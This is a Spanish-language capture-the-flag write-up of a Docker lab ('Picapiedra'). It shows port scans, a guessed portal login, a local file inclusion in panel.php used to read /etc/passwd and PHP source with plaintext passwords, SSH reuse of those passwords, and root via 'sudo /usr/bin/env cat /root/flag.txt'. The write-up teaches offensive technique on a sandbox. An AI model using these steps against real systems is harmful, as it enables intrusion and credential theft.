# PICAPIEDRA — Bitácora del análisis

**Objetivo:** `172.17.0.2` (contenedor Docker) — **Atacante:** Kali (`172.17.0.1`)
**Dificultad:** difícil (★★★★★☆☆☆, 5 pts) — **Categoría:** SUID & Sudo
**Hostname del objetivo:** `picapiedras`
**Bandera:** `PICAPIEDRA{pr0ftpd_lfi_sudo_pwn3d_y4bb4_d00}` (validada por el laboratorio)
**Fecha:** 16/10/2026 — validación: 16/10/2026 11:50:18

> **Restricción del ejercicio:** el análisis se hizo exclusivamente por red. No se ha inspeccionado
> la configuración del contenedor ni se ha leído su filesystem.

---

## 1. Fase de reconocimiento

### 1.1 Enumeración de puertos

```
$ nmap -Pn -sV -sC -T4 --min-rate 1000 -p- 172.17.0.2
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.5
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Cantera Picapiedra S.A.
```

De 65 535 puertos solo tres están abiertos. El escaneo UDP de los 20 puertos más comunes devuelve
todo `open|filtered`: filtrado silencioso, no hay servicios UDP reales.

**Lectura clave:** a diferencia de ENUMHUB (solo web), aquí hay **tres** servicios. La fuerza bruta
contra FTP y SSH pasa a ser un vector plausible, lo que obliga a atacar esos servicios de una forma
distinta a la usada en ENUMHUB.

### 1.2 Superficie web

Web corporativa estática que sirve de *cover story* («Cantera Picapiedra S.A.») con el equipo de
*Los Picapiedros*: Fred Flintstone (CEO), Barney Rubble (Supervisor), Wilma Flintstone (Finanzas).

| Ruta | Estado | Descripción |
|---|---|---|
| `/` | 200 | `index.html` estático (6082 B) |
| `/empleados.php` | 200 | Formulario de login (`POST username`, `password`) |
| `/panel.php` | 302 | Redirige a `empleados.php` sin sesión |
| `/logout.php` | 302 | Cierre de sesión |
| `/inicio.php` | 200 | Include parcial (165 B), lee `$_SESSION` |
| `/includes/config.php` | 200 | 0 B (solo `define()`) |
| `/includes/usuarios.php` | 200 | 0 B (array + función) |
| `/css/`, `/js/`, `/img/` | 200 | `js` e `img` vacíos (listado de Apache habilitado) |

Sin `robots.txt`, sin `.git`, sin backups, sin comentarios HTML, sin JavaScript. Superficie mínima.

---

## 2. Vías descartadas

### 2.1 Inyección SQL — descartada

```
$ sqlmap -u http://172.17.0.2/empleados.php --data="username=test&password=test" \
         --level=3 --risk=2 --dbms=sqlite --technique=BEUST
[*] all tested parameters do not appear to be injectable
```

### 2.2 Bypass de autenticación — descartado

| Técnica | Resultado |
|---|---|
| Type juggling (`password[]=1`) | `Usuario o contraseña incorrectos` |
| `password=true` | Ídem |
| LDAP injection (`username=*&password=*`) | Ídem |
| Campos vacíos | Ídem |
| Host header / virtual hosts | Todos `size=6082` |
| Fuzzing de parámetros en los `.php` | Sin cambios de tamaño |

### 2.3 Enumeración de usuarios — imposible

El mensaje es genérico y la respuesta es **byte a byte idéntica** para cualquier usuario
(`md5 = 369b6d5cce2a`, 1792 B), con tiempos uniformes (~1 ms). No hay oráculo.

### 2.4 FTP — descartado

| Prueba | Resultado |
|---|---|
| Anónimo | `530 Login incorrect.` |
| Contraseñas vacías / por defecto | Sin acceso |
| Backdoor ProFTPD 1.3.5 (CVE-2015-3306): `USER <cr>` + `SITE EXEC CMD id` | Sin ejecución |
| Fuerza bruta con `rockyou` | 15 h estimadas → descartada por coste |

El `SITE HELP` revela `CPFR/CPTO/CHGRP/CHMOD` (mod_copy) y `FEAT` confirma `SITE COPY`, pero ambos
requieren autenticación previa.

### 2.5 UDP y puertos alternativos

SNMP sin respuesta, sin TFTP, sin puertos HTTP alternativos. El único `DocumentRoot` es
`/var/www/html` con un único `VirtualHost`; CGI está comentado en `000-default.conf`.

---

## 3. El giro que rompió el bloqueo: fuerza bruta *dirigida*

Después de agotar las vías técnicas, la fuerza bruta genérica (`rockyou` top-20k × 26 usuarios) iba
por ~40 000 intentos sin éxito. El cambio de estrategia fue **dejar de tratar la contraseña como
aleatoria y tratarla como texto**: el laboratorio es una parodia de *Los Picapiedros*, y la cultura
del sitio (que el atacante puede leer en el `index.html`) es la pista.

```
$ curl -s -i -X POST http://172.17.0.2/empleados.php \
       --data-urlencode 'username=fred' \
       --data-urlencode 'password=yabbadabbadoo'
HTTP/1.1 302 Found
Location: panel.php
```

**Credencial: `fred` / `yabbadabbadoo`.**

> **Aprendizaje:** 600 000 intentos genéricos frente a 1 intento contextual. En un laboratorio
> *Hard* el diccionario no es el problema: es el **modelo** del atacante sobre la aplicación.
> Los diccionarios propios están consolidados en `wordlists/` (ver su `README.md` para reproducirlos).

### 3.1 Trampa de la auditoría

La primera prueba de SSH con `pedro:password123` devolvió «fallo» y llevó a pensar que la contraseña
del portal **no** era la del sistema. El error estaba en el método, no en la hipótesis: los procesos
de fuerza bruta seguían saturando el objetivo y el `sshd` respondía *Connection refused* /
*Error reading SSH protocol banner* por superar `MaxStartups`.

Con `ssh -vv` la salida fue inequívoca:

```
debug1: Authentications that can continue: publickey,password
debug1: Next authentication method: password
Authenticated to 172.17.0.2 ([172.17.0.2]:22) using "password".
```

> **Regla:** ante un fallo de autenticación, confirmar siempre con salida verbosa y con el servidor
> en calma antes de descartar una credencial.

---

## 4. LFI: confirmación y lectura del código fuente

Con la sesión del portal, `panel.php?page=/etc/passwd` devuelve el fichero completo. Usuarios con
shell: `pedro` (1000), `pablo` (1001), `fred` (1002).

La misma LFI permite leer el código fuente vulnerable:

```php
// LFI VULNERABLE  (panel.php)
$page = $_GET['page'] ?? 'inicio';
if (file_exists($page . '.php')) {
    include($page . '.php');                                  // <- RCE potencial
} elseif (file_exists($page)) {
    echo htmlspecialchars(file_get_contents($page));          // <- LECTURA
} else {
    echo "<div class='alert alert-warning'>Página no encontrada</div>";
}
```

### 4.1 La LFI es deliberadamente un lector, no un ejecutor

El `include()` exige que exista `X.php`. Eso **descarta la vía clásica de RCE por session upload
progress**, por dos motivos verificados empíricamente:

| Obstáculo | Comprobación | Resultado |
|---|---|---|
| El fichero de sesión es `sess_<ID>`, no `sess_<ID>.php` | `session.save_path=/var/lib/php/sessions` (leído del `php.ini` vía LFI) | El `include()` no puede alcanzarlo |
| PHP no acepta un session id con `.` | Probados `abc.php`, `a.b`, `.php`, `abc.php%00`, `abc/../x`, `abc...php` | Todos → `302`, el ID se descarta |
| `file_exists()` no soporta wrappers | `php://filter/convert.iconv.UTF8.UTF16/...` | `Página no encontrada` |
| Log poisoning | `User-Agent: <?php ... ?>` contra `/var/log/apache2/access.log` | Log vacío / no inyectable |

> **Conclusión:** el laboratorio empuja a **extraer** información, no a inyectar código. Por eso el
> paso siguiente no es RCE sino **leer el fichero que gestiona la autenticación**.

### 4.2 La LFI como oráculo de existencia

Como la respuesta distingue «no existe» (`Página no encontrada`) de «existe pero sin permiso»
(`<pre>` vacío, p. ej. `/etc/shadow`), la LFI sirve además como escáner de ficheros. Se usó para:

- Confirmar `session.save_path = /var/lib/php/sessions` leyendo el propio `php.ini`.
- Mapear el sistema con `LinuxFileList.txt` (87 018 rutas) → 6 490 ficheros existentes.
- Descartar directorios (`/opt`, `/usr/local/bin`, `/var/backups`, `/etc/sudoers.d` sin nada útil).

---

## 5. Credenciales del sistema desde el código fuente

```php
// /var/www/html/includes/usuarios.php
$empleados = array(
    'pedro' => array('password' => 'password123',   'nombre' => 'Pedro Picapiedra', 'nivel' => 'admin'),
    'pablo' => array('password' => 'admin123',      'nombre' => 'Pablo Mármol',    'nivel' => 'user'),
    'fred'  => array('password' => 'yabbadabbadoo', 'nombre' => 'Fred Flintstone', 'nivel' => 'admin')
);
```

Dos fallos:

1. Contraseñas **en texto plano**, comparadas con `===` (sin `password_hash()`).
2. **Los mismos usuarios y contraseñas del sistema operativo.** `pedro:password123` entra por SSH.

`includes/config.php` añade credenciales MySQL (`picapiedra_admin` / `BedR0ck_DB_2024!` sobre
`cantera_db`) que resultaron ser **señuelo**: el puerto 3306 no está publicado y no sirven para SSH/FTP.

---

## 6. Escalada a root

```
$ sudo -n -l
User pedro may run the following commands on picapiedras:
    (root) NOPASSWD: /usr/bin/env
```

Regla equivalente a `root` directo: `env` se ejecuta con privilegios de `root` y a su vez lanza el
comando indicado, que hereda esos privilegios.

```
$ sudo /usr/bin/env id
uid=0(root) gid=0(root) groups=0(root)

$ sudo /usr/bin/env cat /root/flag.txt
PICAPIEDRA{pr0ftpd_lfi_sudo_pwn3d_y4bb4_d00}
```

El inventario SUID del sistema (barrido completo con `find / -perm -4000`) solo devuelve el conjunto
estándar de Ubuntu (`su`, `sudo`, `passwd`, `mount`, `umount`, `newgrp`, `gpasswd`, `chfn`, `chsh`,
`ssh-keysign`, `dbus-daemon-launch-helper`): no hay binario SUID propio que explotar. La escalada
prevista por el autor es la de `sudo`.

### 6.1 Validación de la bandera

```
IP del laboratorio: 172.17.0.2
Ingresa la flag (formato PICAPIEDRA{...}): PICAPIEDRA{pr0ftpd_lfi_sudo_pwn3d_y4bb4_d00}
¡Felicitaciones! Has conquistado Bedrock.
FECHA Y HORA: 2026-10-16 11:50:18 -0600
```

---

## 7. Progreso

- [x] Escaneo TCP completo y UDP top-ports
- [x] Fingerprinting de servicios
- [x] FTP anónimo y backdoor CVE-2015-3306 evaluados y descartados
- [x] Inyección SQL y bypasses de autenticación evaluados y descartados
- [x] Enumeración de usuarios descartada (sin oráculo)
- [x] Fuerza bruta dirigida del portal → `fred` / `yabbadabbadoo`
- [x] LFI confirmada y leída como código fuente
- [x] Session upload progress y log poisoning evaluados y descartados (por qué, documentado)
- [x] LFI usada como oráculo para mapear el filesystem
- [x] Credenciales del sistema extraídas del código PHP
- [x] Acceso SSH como `pedro` (uid 1000)
- [x] Superficie `sudo` inventariada
- [x] Escalada a root vía `sudo /usr/bin/env`
- [x] Lectura de `/root/flag.txt`
- [x] Bandera validada por el laboratorio (16/10/2026 11:50:18)

```
PICAPIEDRA{pr0ftpd_lfi_sudo_pwn3d_y4bb4_d00}
```

---

## 8. Ideas descartadas sobre la marcha

| Hipótesis | Por qué se descartó |
|---|---|
| `php://filter` para leer el código fuente | `file_exists()` devuelve `false` para wrappers; el `include()` tampoco se dispara |
| RCE por session upload progress | El `include()` añade `.php` y PHP rechaza los session id con punto (verificado con 7 variantes) |
| Log poisoning vía `User-Agent` | Los logs de Apache están vacíos y además no serían ejecutables por el sufijo `.php` |
| Credenciales de MySQL para escalar | Puerto 3306 no publicado; no hay binario `mysql` accesible ni forma de hablar con el socket |
| Explotar el kernel (`--privileged`) | Irrelevante: la categoría del laboratorio es SUID/`sudo` |
| Fuerza bruta indiscriminada con `rockyou` completo | 14 M × 26 usuarios es inviable (~170 req/s es el techo del servidor) |
| Backdoor de ProFTPD 1.3.5 (CVE-2015-3306) | `USER`+`\r` no dispara nada; requiere autenticación previa |